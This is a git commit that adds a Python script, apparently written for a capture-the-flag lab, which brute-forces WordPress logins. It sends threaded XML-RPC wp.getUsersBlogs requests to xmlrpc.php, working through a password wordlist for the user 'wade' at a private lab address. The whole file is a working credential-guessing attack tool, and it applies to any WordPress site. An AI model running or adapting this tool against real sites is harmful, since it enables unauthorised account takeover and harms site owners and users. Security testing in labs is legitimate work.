c80158575a2c9d6b8578aee65171d65a33a32118
Esevka <139042999+Esevka@users.noreply.github.com>
2023-09-17 10:04:58 +0200

    WP Login Brute Force using Xmlrpc.php

---
+++ Scripts en Python/WPlogin_brute.py
@@ -0,0 +1,56 @@
+import requests
+import concurrent.futures
+
+flag = 0
+
+def brute_wp(passwd,usuario,url):
+
+	global flag
+
+	if flag != 1:
+
+		cookie = {'Cookie':'wordpress_test_cookie=WP+Cookie+check'}
+		datos = """<?xml version="1.0" encoding="UTF-8"?>
+						<methodCall> 
+						<methodName>wp.getUsersBlogs</methodName> 
+						<params> 
+						<param><value>{}</value></param> 
+						<param><value>{}</value></param> 
+						</params> 
+						</methodCall>""".format(usuario,passwd)
+		
+		r = requests.post(url,data=datos,headers=cookie)
+
+		if r.headers.get('Content-Length') == '403':
+			if flag !=1:
+				print('[-]Pass NO --> {}'.format(passwd),end='\r')
+				print(end='\x1b[2K')
+		else:
+			print('[+]Pass SI -->{}'.format(passwd))
+			print('Finalizando tareas espere...')
+			flag = 1 
+			
+def main():
+
+	url = "http://10.10.135.197/retro/xmlrpc.php"
+	usuario = 'wade'
+
+	file = 'dic_baseweb.txt'
+
+	with open(file) as dic:
+		
+		with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
+			futures = []
+
+			for passwd in dic:
+				passwd = passwd.strip()
+				futures.append(executor.submit(brute_wp, passwd, usuario, url))
+
+
+			for futures in concurrent.futures.as_completed(futures):
+				if flag == 1:
+					executor.shutdown(wait=False,cancel_futures=True)
+					exit()
+
+if __name__=='__main__':
+	main()
